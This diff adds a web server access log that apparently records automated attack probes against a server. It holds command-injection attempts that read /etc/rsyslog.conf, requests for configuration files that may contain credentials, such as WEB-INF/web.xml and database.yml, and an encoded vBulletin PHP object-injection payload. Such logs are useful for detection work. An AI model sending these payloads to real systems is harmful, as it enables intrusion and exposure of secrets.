@@ -1,0 +1,16 @@
+[2018-09-17 11:00:23.950] [INFO] access - GET /1;cat%20/etc/rsyslog.conf;
+[2018-09-17 11:00:24.132] [INFO] access - GET /1';cat%20/etc/rsyslog.conf;'
+[2018-09-17 11:00:24.269] [INFO] access - GET /1%22;cat%20/etc/rsyslog.conf;%22
+[2018-09-17 11:17:51.136] [INFO] access - GET /WEB-INF/web.xml
+[2018-09-17 11:17:51.292] [INFO] access - GET /WEB-INF/applicationContext.xml
+[2018-09-17 11:17:51.420] [INFO] access - GET /WEB-INF/config.xml
+[2018-09-17 11:17:51.531] [INFO] access - GET /WEB-INF/classes/hibernate.cfg.xml
+[2018-09-17 11:17:51.670] [INFO] access - GET /server.xml
+[2018-09-17 11:17:51.835] [INFO] access - GET /WEB-INF/classes/struts.xml
+[2018-09-17 11:17:51.999] [INFO] access - GET /config/database.yml
+[2018-09-17 11:25:37.434] [INFO] access - GET /
+[2018-09-17 11:33:19.820] [INFO] access - GET /nmask_test_file
+[2018-09-17 11:33:19.980] [INFO] access - GET /CVS/Root
+[2018-09-17 11:48:38.607] [INFO] access - GET /ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D
+[2018-09-17 11:48:54.939] [INFO] access - GET /
+[2018-09-17 11:50:41.049] [INFO] access - GET /
